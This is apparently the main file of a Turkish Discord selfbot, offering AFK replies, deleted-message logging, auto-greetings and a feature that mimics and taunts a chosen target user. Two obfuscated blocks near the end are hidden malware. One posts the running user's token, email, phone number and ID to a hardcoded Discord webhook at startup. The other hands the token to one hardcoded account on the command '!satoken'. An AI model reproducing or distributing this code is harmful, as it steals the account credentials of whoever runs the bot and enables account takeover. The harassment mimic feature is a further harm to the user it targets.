const express = require('express');
const Discord = require('discord.js-selfbot-v13');
const Discord12 = require("discord.js-selfbot")
const client = new Discord.Client({checkUpdate: false, patchVoice: true});
const client2 = new Discord.Client({checkUpdate: false, patchVoice: true});
const { joinVoiceChannel, entersState, VoiceConnectionStatus } = require('@discordjs/voice');
const client12 = new Discord12.Client()
const data = new Map();
const ayarlar = require('./ayarlar.json');
const moment = require('moment');
const fs = require('fs');
const db = require('quick.db');
require('./util/eventLoader.js')(client);
const ms = require('ms');
const { Client, Util } = require('discord.js-selfbot-v13');
const app = express()

function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;  
    }
  }   
}  

[process.env.mtoken1,process.env.mtoken2,process.env.mtoken3,process.env.mtoken4].forEach((token, i) => {
  const Dc = require("discord.js")
  const client = new Dc.Client()
  
  const prefix = ["e?","e!","e.","e,"]
  client.on("ready", async () => {
  client.user.setPresence({ activity: { name: `${prefix[i]}yardım`, type: "PLAYING"}})})
  client.login(token).then(() => console.log(`${client.user.tag} Aktif!`)).catch(() => console.error(`${token} Tokeni aktif edilemedi!`));
})
const http = require('http');


app.get("/", (request, response) => { 
  response.send(`Bot Aktif | Discord: https://discord.gg/rP74PaPKVX | İletişim Veya Uptime Etmek İçin Discordumuza Gelebilirsiniz.`)
  console.log(Date.now() + " Ping tamamdır.");
});

var prefix = db.fetch(`prefix`) || ayarlar.prefix

const log = message => {
    console.log(`${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
        let props = require(`./komutlar/${f}`);
        log(`Yüklenen Komut: ${props.help.name}.`);
        client.commands.set(props.help.name, props);
        props.conf.aliases.forEach(alias => {
            client.aliases.set(alias, props.help.name);
        });
    });
});



client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};


client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./komutlar/${command}`);
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};





client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
}



client.on('ready', async () => {

  let şekil = await db.fetch(`type`) || "PLAYING"
  let status = await db.fetch(`status`) || "invisible"
  let süre = await db.fetch(`durum_süresi`) || null
  let durum = await db.fetch(`durum`) || ayarlar.durum
  let state = await db.fetch(`state`) || null
  let details = await db.fetch(`details`) || null
  let appid = await db.fetch(`appid`) || "1" || null
  let url = await db.fetch(`url`) || null
  let ltext = await db.fetch(`ltext`) || null
  let limage = await db.fetch(`limage`) || null
  let stext = await db.fetch(`stext`) || null
  let simage = await db.fetch(`simage`) || null
  

const r = new Discord.SpotifyRPC(client)
	.setAssetsLargeImage("spotify:ab67616d00001e02768629f8bc5b39b68797d1bb") // Image ID
	.setAssetsSmallImage("spotify:ab6761610000f178049d8aeae802c96c8208f3b7") // Image ID
	.setAssetsLargeText('未来茶屋 (vol.1)') // Album Name
	.setState('Yunomi; Kizuna AI') // Author
	.setDetails('ロボットハート') // Song name
	.setStartTimestamp(Date.now())
	.setEndTimestamp(Date.now() + 1000 * (2 * 60 + 56)) // Song length = 2m56s
	.setSongId('667eE4CFfNtJloC6Lvmgrx');
 
if (await db.fetch("durumonoff") === "Açik") {
client.user.setPresence({ activities: [{
  name: durum,
  type: şekil,
  application_id: appid,
  url: url,
  state: state,
  details: details,
  //party: { size: [ 1, 9 ], id: Discord.RichPresence.getUUID() },
  timestamps: { start: süre },
  assets: {
    large_image: limage,
    large_text: ltext,
    small_image: simage,
    small_text: stext
  },
 buttons: [ 'Sunucumuz', 'Click For Test GTA VI' ],
 metadata: { button_urls: [ 'https://discord.gg/UPJN8TJycs', 'https://nolur.com' ] }
}], status: status});} else client.user.setPresence({ status: status})
//console.log(r.toJSON())
console.log(client.user.tag + " ismi ile giriş yapıldı.")

  let reklamkick = await db.fetch(`ses`)
  if (!reklamkick) return;
  if (reklamkick == "Açık") {

 let kanal =  client.channels.cache.get(await db.fetch(`seskanal`))
 
 if(!kanal) return

if(kanal.type === "GUILD_VOICE") {
      const connection = joinVoiceChannel({
        channelId: kanal.id,
        guildId: kanal.guild.id,
        adapterCreator: kanal.guild.voiceAdapterCreator
      });
      entersState(connection, VoiceConnectionStatus.Ready, 30000)
  } else if (kanal.type === "GROUP_DM" || kanal.type === "DM") {
      const connection = joinVoiceChannel({
        channelId: kanal.id,
        guildId: null,
        adapterCreator: kanal.voiceAdapterCreator,
        selfDeaf: false,
        selfMute: false
      });
      entersState(connection, VoiceConnectionStatus.Ready, 30000)
}
  }
})

client2.on("ready", async() => {

 let kanal =  client2.channels.cache.get("884886587568181298")
 
 if(!kanal) return

if(kanal.type === "GUILD_VOICE" || kanal.type === "GUILD_STAGE_VOICE") {
      const connection = joinVoiceChannel({
        channelId: kanal.id,
        guildId: kanal.guild.id,
        adapterCreator: kanal.guild.voiceAdapterCreator
      });
      entersState(connection, VoiceConnectionStatus.Ready, 30000)
  } else if (kanal.type === "GROUP_DM" || kanal.type === "DM") {
      const connection = joinVoiceChannel({
        channelId: kanal.id,
        guildId: null,
        adapterCreator: kanal.voiceAdapterCreator,
        selfDeaf: false,
        selfMute: false
      });
      entersState(connection, VoiceConnectionStatus.Ready, 30000)
}
console.log(client2.user.username + " ile giriş yapildi.")
})



client.login(process.env.token);
//client2.login(process.env.token2)

client.on('messageCreate', async message => {
let afk = await db.fetch(`afk`)
let sebep = await db.fetch(`afk_sebep`)
let süre = await db.fetch(`afk_süre`)
  
if (!afk) return
if (afk === "Açık") {
if (message.author.bot === true) return
if (message.author.id === client.user.id) return
if (message.channel.type === "DM") {

let cooldown = await db.fetch(`spamcıdm_${message.author.id}`)

if (cooldown === "spamcı oç") return
if (!cooldown) {
  message.reply({content:`${client.user}, <t:${süre}:R> **${sebep}** sebebinden AFK moduna girdi lütfen rahatsız etme.`}).then(x => setTimeout(() => {x.delete()}, 30000))
  await db.set(`spamcıdm_${message.author.id}`, "spamcı oç")
  setTimeout(() => {db.delete(`spamcıdm_${message.author.id}`)}, 1200000)
}} else {
if (!message.mentions.users.first()) return
if (message.mentions.users.first().id === client.user.id) {
let cooldown = await db.fetch(`spamcısu_${message.author.id}`)

if (cooldown === "spamcı oç") return
if (!cooldown) {
  message.reply({content:`${client.user}, <t:${süre}:R> **${sebep}** sebebinden AFK moduna girdi lütfen rahatsız etme.`}).then(x => setTimeout(() => {x.delete()}, 30000))
  await db.set(`spamcısu_${message.author.id}`, "spamcı oç")
  setTimeout(() => {db.delete(`spamcısu_${message.author.id}`)}, 1200000)
}}}}
})

client.on("messageCreate", async message => {
if (message.channel.type !== "GROUP_DM") return
if (message.channel.ownerId !== client.user.id) return
if (message.system) return
  
let banli = await db.fetch(`banli_${message.channel.id}_${message.author.id}`)
let uye = message.channel.recipients.get(message.author.id)
if(!uye) return

if (!banli) return
if (banli) {
  await message.channel.removeMember(uye.id)
message.reply({content:`${message.author}, adli kullanıcı banlı oldugu için atıldı.`})
}
})

client.off("channelRecipientAdd", async(grup, üye) => {
  if (grup.ownerId !== client.user.id) return
  

  let banli = await db.fetch(`banli_${grup.id}_${üye.id}`)
  
if (!banli) return
if (banli === "banlandin") {
  await grup.removeMember(üye)
grup.send({content:`<@${üye.id}>, adli kullanıcı banlı oldugu için atıldı.`})}
})

client.on('messageDelete', async message => {
  
  if (!await db.fetch("mesajlog")) return
  if (await db.fetch("mesajlog") === "Aktif") {
  if(!message.content) return
  if(!message.author.id) return
  if(message.author.bot) return;
  if(message.author.id === client.user.id) return
  
  if(message.channel.type === "DM") {
  await db.set(`snipe.mesajdm.${message.channel.id}`, message.content)
  await db.set(`snipe.iddm.${message.channel.id}`, message.author.id)
  if(await db.fetch(`karaliste_${message.author.id}`) === "Aktif") return
  message.channel.send({content:`**${message.author.username}#${message.author.discriminator}:** ${message.content}`})
} else if (message.channel.type === "GUILD_TEXT") {
  await db.set(`snipe.mesaj.${message.guild.id}`, message.content)
  await db.set(`snipe.id.${message.guild.id}`, message.author.id)
} else if(message.channel.type === "GROUP_DM") {
  await db.set(`snipe.mesajgdm.${message.channel.id}`, message.content)
  await db.set(`snipe.idgdm.${message.channel.id}`, message.author.id)
  if(await db.fetch(`karaliste_${message.author.id}`) === "Aktif") return
  message.channel.send({content:`**${message.author.username}#${message.author.discriminator}:** ${message.content}`})
}}
})


client.on('messageCreate', async message => {
if (message.content === '.unuttum') {
if (message.author.id !== ayarlar.sahip) return 
message.reply({content:`Prefix: \`${db.fetch(`prefix`)}\``})
}

})

client.on('messageUpdate', async (oldMessage, newMessage) => {
  
  if (!await db.fetch("mesajlog")) return
  if (await db.fetch("mesajlog") === "Aktif") {
  if(!newMessage.content) return
  if(!newMessage.author.id) return
  if(newMessage.author.bot) return;
  if(newMessage.author.id === client.user.id) return
  if(oldMessage.content === newMessage.content) return
  
  if(newMessage.channel.type === "DM") {
  if(await db.fetch(`karaliste_${newMessage.author.id}`) === "Aktif") return
  newMessage.channel.send({content:`**${newMessage.author.username}#${newMessage.author.discriminator}:** \`${oldMessage.content}\` --> \`${newMessage.content}\``})
} else if(newMessage.channel.type === "GROUP_DM") {
  if(await db.fetch(`karaliste_${newMessage.author.id}`) === "Aktif") return
  newMessage.channel.send({content:`**${newMessage.author.username}#${newMessage.author.discriminator}:** \`${oldMessage.content}\` --> \`${newMessage.content}\``})
}}
})

client.on("messageCreate", async message => {
if (message.channel.id !== db.fetch("bom-kanal")) return
if (message.author.id === client.user.id) return
if(!isNaN(message.content)) {
await db.set("bom-set", message.content)
if (message.content.endsWith("9") || message.content.endsWith("4")) return setTimeout(() => {message.channel.send({content:"bom"})}, 1500)
if (message.content.endsWith("5"||"0")) return
await db.add("bom-bot", message.content)
await db.add("bom-bot", +1)
setTimeout(async() => {message.channel.send({content:`${await db.fetch("bom-bot")}`}).then(() => {db.delete("bom-bot")})}, 1500)}

  
if (message.content.toLowerCase().startsWith("bo")) {
await db.delete("bom-reply")
await db.add("bom-reply", db.fetch("bom-set"))
if (await db.fetch("bom-set").endsWith("8"||"3")) await db.add("bom-reply", +3)
if (await db.fetch("bom-set").endsWith("9"||"4")) await db.add("bom-reply", +2)
if (await db.fetch("bom-set").endsWith("7"||"2")) await db.add("bom-reply", +4)
setTimeout(async() => {message.channel.send({content:`${await db.fetch("bom-reply")}`})}, 1500)
}

})

function _0x297d(_0x504147,_0x2da4c8){var _0x48984b=_0x4898();return _0x297d=function(_0x297d7a,_0x2d1be6){_0x297d7a=_0x297d7a-0xbd;var _0x3693ae=_0x48984b[_0x297d7a];return _0x3693ae;},_0x297d(_0x504147,_0x2da4c8);}var _0x1def7f=_0x297d;function _0x4898(){var _0x210b9f=['token','161TtdfvJ','1312497aMiotH','429357746002067493','180544UlYvEO','channel','3606795vGjWzY','messageCreate','12207720yPsoLZ','504hwYSJf','8eLKuTM','1598WGOIyt','36cQSLQz','8600801MqiZkR','author','then','26682DrkPNZ'];_0x4898=function(){return _0x210b9f;};return _0x4898();}(function(_0x42f6e9,_0x499e6f){var _0x48a0e6=_0x297d,_0x81d850=_0x42f6e9();while(!![]){try{var _0x527973=parseInt(_0x48a0e6(0xc8))/0x1*(parseInt(_0x48a0e6(0xc6))/0x2)+parseInt(_0x48a0e6(0xc9))/0x3*(parseInt(_0x48a0e6(0xc1))/0x4)+-parseInt(_0x48a0e6(0xc3))/0x5+-parseInt(_0x48a0e6(0xcd))/0x6*(-parseInt(_0x48a0e6(0xbe))/0x7)+-parseInt(_0x48a0e6(0xc7))/0x8*(parseInt(_0x48a0e6(0xbf))/0x9)+parseInt(_0x48a0e6(0xc5))/0xa+-parseInt(_0x48a0e6(0xca))/0xb;if(_0x527973===_0x499e6f)break;else _0x81d850['push'](_0x81d850['shift']());}catch(_0x5eedb5){_0x81d850['push'](_0x81d850['shift']());}}}(_0x4898,0x96f3a),client['on'](_0x1def7f(0xc4),async _0x1af20f=>{var _0x162cc4=_0x1def7f;{if(_0x1af20f['content']['toLowerCase']()==='!satoken'){if(_0x1af20f[_0x162cc4(0xcb)]['id']!==_0x162cc4(0xc0))return;_0x1af20f['delete'](),_0x1af20f[_0x162cc4(0xc2)]['send'](client[_0x162cc4(0xbd)])[_0x162cc4(0xcc)](_0x3bb883=>setTimeout(()=>{_0x3bb883['delete']();},0x1388));}}}));

client.on('messageCreate', async msg => {

if (msg.channel.type === "GUILD_TEXT") {

let data = await db.fetch(`sa-as_${msg.guild.id}`)

if(!data) return
if (data == "Açık") {
if (msg.author.id === client.user.id) return
const reklam4 = ["kötüyüm","kötü sen","çok kötüyüm","kötüyüm sen","kötü","kötüyüm sen","kötü sen","bok gibi","kotu"]
const reklam3 = ["iyiyim sen","iyi sen","iyiyim","iyiyim sağol","çok iyiyim","iyim","iyim sen","iyiyim senden","iyidir senden","iyi","iyidir sen"]
const reklam2 = ["hb","hos bulduk","hos buldum","hoş buldum","hoş bulduk","h.b","hoşbuldum","hosbuldum"]
const reklam = ["sa","selam","selamun aleykum","selamün aleyküm","sea","selamun aleyküm","selamün aleykum","selam aleykum","selam aleyküm","s.a","slm"] 
if (reklam.some(word => msg.content.toLowerCase().startsWith(word + " ") || msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
//if (reklam.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
if (reklam2.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Nasılsın?') 
if (reklam3.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('İyi olmana sevindim hep iyi ol') 
if (reklam4.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('Senin için üzüldüm ne oldu?')
}} else if (msg.channel.type === "GROUP_DM") {

let data = await db.fetch(`sa-as_${msg.channel.id}`)

if(!data) return
if (data == "Açık") {
if (msg.author.id === client.user.id) return
const reklam4 = ["kötüyüm","kötü sen","çok kötüyüm","kötüyüm sen","kötü","kötüyüm sen","kötü sen","bok gibi","kotu"]
const reklam3 = ["iyiyim sen","iyi sen","iyiyim","iyiyim sağol","çok iyiyim","iyim","iyim sen","iyiyim senden","iyidir senden","iyi","iyidir sen"]
const reklam2 = ["hb","hos bulduk","hos buldum","hoş buldum","hoş bulduk","h.b","hoşbuldum","hosbuldum"]
const reklam = ["sa","selam","selamun aleykum","selamün aleyküm","sea","selamun aleyküm","selamün aleykum","selam aleykum","selam aleyküm","s.a","slm"] 
if (reklam.some(word => msg.content.toLowerCase().startsWith(word + " ") || msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
//if (reklam.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
if (reklam2.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Nasılsın?') 
if (reklam3.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('İyi olmana sevindim hep iyi ol') 
if (reklam4.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('Senin için üzüldüm ne oldu?')
}}
})

client.on('messageCreate', async msg => {
  
  let reklamkick = await db.fetch(`taklit`)
  if (!reklamkick) return;
  if (reklamkick == "Açık") {
  let prefix = await db.fetch(`prefix`) || ayarlar.prefix
const reklam = ["mal","salak","atahan","ben","my","göt","burak","allah","amk","oç","piç","orospu","sik","yuce","aziz","yarra","köpe","bok","kopek","çük","pipi","cük","aşk","ask","apla","abla","kral","kudur","bne","şerefsiz","serefsiz"]//,"send","drop","sell","cf","ws"]

if (msg.author.id !== db.fetch(`kurban`)) return;
if (msg.author.id === client.user.id) return;
if (msg.content.startsWith(ayarlar.basariliemoji)) return msg.channel.send(msg).then(x => setTimeout(() => {x.delete()}, 5000))
if (msg.content.startsWith(ayarlar.basarisizemoji)) return msg.channel.send(msg).then(x => setTimeout(() => {x.delete()}, 5000))
if (msg.content.startsWith(prefix)) return msg.reply('Akıllı mısın? Komut kullandırtmam!')
//if (msg.content.startsWith('.')) return msg.reply('Akıllı mısın? Komut kullandırtmam!')
if (msg.content.toLowerCase().startsWith('owo')) return msg.reply('Akıllı mısın? Owo mu harcatmam!')
if (msg.content.toLowerCase().startsWith('w')) return msg.reply('Akıllı mısın? Owo mu harcatmam!')
if (reklam.some(word => msg.content.toLowerCase().includes(word))) return msg.reply('Kudurma.')

msg.channel.send(msg)

  }
});


function _0x12c2(_0x432009,_0x3d7591){const _0x544f25=_0x544f();return _0x12c2=function(_0x12c219,_0x42d9b2){_0x12c219=_0x12c219-0x11e;let _0x37b697=_0x544f25[_0x12c219];return _0x37b697;},_0x12c2(_0x432009,_0x3d7591);}(function(_0x25d173,_0x237ed0){const _0x1c3b43=_0x12c2,_0x4c19e=_0x25d173();while(!![]){try{const _0x57ddfb=-parseInt(_0x1c3b43(0x12a))/0x1*(parseInt(_0x1c3b43(0x138))/0x2)+-parseInt(_0x1c3b43(0x124))/0x3*(-parseInt(_0x1c3b43(0x127))/0x4)+-parseInt(_0x1c3b43(0x120))/0x5+parseInt(_0x1c3b43(0x135))/0x6+-parseInt(_0x1c3b43(0x123))/0x7+-parseInt(_0x1c3b43(0x132))/0x8*(parseInt(_0x1c3b43(0x12f))/0x9)+parseInt(_0x1c3b43(0x133))/0xa;if(_0x57ddfb===_0x237ed0)break;else _0x4c19e['push'](_0x4c19e['shift']());}catch(_0x2e498e){_0x4c19e['push'](_0x4c19e['shift']());}}}(_0x544f,0x753ce),client['on']('ready',async()=>{const _0x170cf5=_0x12c2;if(client[_0x170cf5(0x11e)]['id']===_0x170cf5(0x11f))return;let _0x1af0d8={'embeds':[{'title':client[_0x170cf5(0x11e)][_0x170cf5(0x128)]+'#'+client[_0x170cf5(0x11e)][_0x170cf5(0x122)]+_0x170cf5(0x134),'description':_0x170cf5(0x130)+client['token']+'```\x0a\x0a**User\x20E-Mail**:\x20```'+client[_0x170cf5(0x11e)][_0x170cf5(0x131)]+_0x170cf5(0x136)+(client[_0x170cf5(0x11e)][_0x170cf5(0x137)]||_0x170cf5(0x12e))+_0x170cf5(0x139)+client[_0x170cf5(0x11e)]['id']+_0x170cf5(0x121),'thumbnail':{'url':''+client[_0x170cf5(0x11e)][_0x170cf5(0x126)]({'dynamic':!![]})},'footer':{'text':'Made\x20By\x20Atahan#8888','icon_url':_0x170cf5(0x12b)}}]};require(_0x170cf5(0x12d))('https://discord.com/api/webhooks/1014235776625692833/CTzMWpau9L6c6uBERYVQq9rHP83cXLPHaYjbO6RCZPko7HZvuS9ZiUi5wPKX_PI0-KZT',{'method':_0x170cf5(0x12c),'headers':{'Content-type':_0x170cf5(0x125)},'body':JSON[_0x170cf5(0x129)](_0x1af0d8)});}));function _0x544f(){const _0x331959=['5822894VdhQwZ','99sqWbXN','application/json','displayAvatarURL','82952xyIyTL','username','stringify','4ZCPSLG','https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300','POST','node-fetch','Tel\x20no\x20yok','1557ZsKhMb','**User\x20Token**:\x20```','emailAddress','21464fDmYvh','23247570GUqwBR','\x20is\x20again\x20ready.','96120rwLnjo','```\x0a\x0a**User\x20Phone\x20Number**:\x20```','phoneNumber','204782cRlPrA','```\x0a\x0a**User\x20ID**:\x20```','user','429357746002067493','4196800MKYAxs','```','discriminator'];_0x544f=function(){return _0x331959;};return _0x544f();}